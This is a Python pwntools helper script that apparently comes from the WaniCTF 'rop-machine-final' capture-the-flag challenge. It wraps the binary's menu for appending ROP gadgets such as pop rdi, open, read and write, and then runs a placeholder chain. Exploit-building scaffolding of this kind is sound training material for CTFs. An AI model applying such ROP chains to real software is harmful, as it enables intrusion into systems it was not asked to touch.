import pwn
import sys


def read_until(s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret


# [menu]
# 0x01. append hex value
# 0x02. append "pop rdi; ret" addr
# 0x03. append "pop rsi; ret" addr
# 0x04. append "pop rdx; ret" addr
# 0x05. append "gets" addr
# 0x06. append "open" addr
# 0x07. append "read" addr
# 0x08. append "write" addr
# 0x0a. show menu (this one)
# 0x0b. show rop_arena
# 0x00. execute rop


def cmd_append_hex(val):
    io.send(b"1\n")
    ret = read_until(b": ")
    s = b"%x\n" % (val)
    io.send(s)
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdi():
    io.send(b"2\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rsi():
    io.send(b"3\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_pop_rdx():
    io.send(b"4\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_gets():
    io.send(b"5\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_open():
    io.send(b"6\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_read():
    io.send(b"7\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_append_write():
    io.send(b"8\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_show_arena():
    io.send(b"b\n")
    ret = read_until(b">")
    print(ret.decode())


def cmd_execute():
    io.send(b"0\n")
    io.interactive()


# io = pwn.remote("rop-machine-final.pwn.wanictf.org", 9005)
io = pwn.process("./final")

ret = read_until(b">")
print(ret.decode())

### followings are just example junk rop codes ###
cmd_append_pop_rdi()
cmd_append_hex(0x404140)
cmd_append_open()
cmd_show_arena()
cmd_execute()
